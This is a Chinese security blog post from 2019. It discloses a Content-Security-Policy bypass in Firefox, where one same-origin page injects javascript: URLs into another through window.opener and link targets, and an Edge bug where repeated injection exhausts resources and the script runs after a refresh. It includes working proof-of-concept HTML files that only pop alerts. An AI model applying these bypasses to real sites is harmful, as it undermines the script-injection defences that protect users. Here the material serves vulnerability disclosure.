# Firefox与Edge的dom策略导致的csp bypass问题

阅读量 **240997**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-08 16:28:07

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01ba5bc0da2d9980b1.jpg)

在2018年对csp研究过一阵，发现可以通过其他的dom向存在CSP的dom注入javascript协议，来达到绕过CSP的安全防护。

众所周知，CSP（内容安全策略）有两种方法来设置，一种是通过浏览器器响应头，如下：

    
    
    Content-Security-Policy:sc-src 'self' https://apis.google.com
    

还有一种就是通过<meta>标签进行设置，如下：

    
    
    <meta http-equiv="Content-Security-Policy" content="sc-src 'none'">
    

我发现这存在一个问题，如果某页面设置了CSP，而同源下其他页面不做CSP防御的话，黑客可以利用opener和target对象来对存在CSP的页面做一个攻击。不了解这两个对象的同学可以参考p牛的target攻击的介绍以及我在17年投稿的那边文章。

回到正题，以opener为例，为此我们创建两个攻击文件，go.html与attack.html

    
    
    <html>
    <head>
      <title>CSP Test</title>
      <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
    </head>
    <body>
    <a href="./attack.html" target="_Blank">csp_let's_go</a>
    <script>alert(location.href);</script>
    </body>
    </html>
    
    
    
    <html>
     <head>
      <title> csp go</title>
     </head>
     <body>
      <script>parent.window.opener.location = "javascript:alert(location.href);"</script>
     </body>
    </html>
    

把两个文件放在一个目录下，你会发现，go.html因为设置了CSP，他的JS代码不能允许。但是如果在Firefox中点击了csp_let’s_go，JS就会执行，那是因为Firefox对该对象没有做防护。

![](https://p0.ssl.qhimg.com/t01cd3f7c9ef0078530.png)

而这在Chrome、Edge、Safiri中是不被允许的

![](https://p5.ssl.qhimg.com/t01c4fb93c64cbbff78.png)

就是这样，通过同源策略允许注入js，绕过了CSP的限制，同样的可以利用target来进行，这将分为两个html文件，go.html与target.html

    
    
    <html>
    <head><meta charset="utf-8"></head>
    <body>
    <a href="./target.html" target="baidu" id="baidu" onclick="return start()">click me</a>
    
    <script>
    function start() {
        setInterval(function() {
            baidu.href="javascript:alert(location.href);";
            baidu.click();
        }, 5000);
    }
    </script>
    </body>
    </html>
    
    
    
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSP Test</title>
      <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
    </head>
    <body>
    csp bypass
    </body>
    </html>
    

同样的，这可以绕过火狐的CSP策略

![](https://p3.ssl.qhimg.com/t013daddb7c791a474f.png)

对于这两个漏洞火狐给予了确定，火狐的回复是：

On the one hand this is injecting a javascript URL into the other document,
which ought to be blocked. On the other hand it’s hard to get too excited
because parent.window.opener.alert(location.href) would be perfectly valid —
the script is being run by a context that allows it, manipulating a DOM it’s
allowed to by the same-origin policy.

![](https://p0.ssl.qhimg.com/t0156a77754f7e13856.png)

**Edge Bug导致存在同样的问题**

发现这个问题是由于在Edge测试如上代码的时候我发现我的系统资源CPU和内存被Edge占用了很高，于是我打开了调试台，看到了如下情况。

![](https://p3.ssl.qhimg.com/t01b88c3a4d02fe02d3.png)

go.html一直向target.html抛出javascript协议，但是target因为CSP策略不断拒绝，go.html就会将被拒绝的请求重新请求一次，在加上时间函数累加上的请求，这里成指数增长，导致了系统资源被耗尽。

在这种情况下对页面进行刷新，可以绕过CSP：

![](https://p0.ssl.qhimg.com/t014ac12699244a01a8.png)

当然这种情况下要用户主动去刷新页面或者对DOM进行操作，我们可以模拟刷新来看到这个Bug：

    
    
    <!DOCTYPE html>
    <html>
    <head>
      <title>CSP Test</title>
      <meta http-equiv="Content-Security-Policy" content="script-src 'none'">
    </head>
    <body>
    <a href="./attack.html" target="_Blank">csp_let's_go</a>
    <script>alert(document.cookie);</script>
    <meta http-equiv="Refresh" content="1" />
    </body>
    </html>
    
    
    
    <html>
     <head>
      <title> csp go</title>
     </head>
     <body>
      <script>
     setInterval(function() {
            parent.window.opener.location = "javascript:alert(location.href);";
        }, 1);
     setInterval(function() {
            parent.window.opener.location = "javascript:alert(location.href);";
        }, 1);
     setInterval(function() {
            parent.window.opener.location = "javascript:alert(location.href);";
        }, 1);
     setInterval(function() {
            parent.window.opener.location = "javascript:alert(location.href);";
        }, 1);
    </script>
     </body>
    </html>
    

我们可以多增加几个线程来验证该问题。

由此可以猜测Edge为了性能，确定了域是同源策略所允许的情况下，不等网页加载出来就执行了js语句，当然这在大多数情况下不会发生，但是由于前面的bug导致了累积过多要执行的线程，导致了问题的触发，这种情况下的攻击非常片面，虽然不一定要用户刷新，但是也要用户点击进入具体的页面才行。在确定问题后将问题上报给msrc，微软已经对控制台这个消耗资源的问题进行了定时清理，虽然这个问题依旧存在，但是攻击面十分狭窄，可以忽略不计。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **xsseng** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/177664](/post/id/177664)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [浏览器安全](/tag/浏览器安全)
  * [CSP](/tag/CSP)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t0143fae528a8ae98bc.jpg) xsseng

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

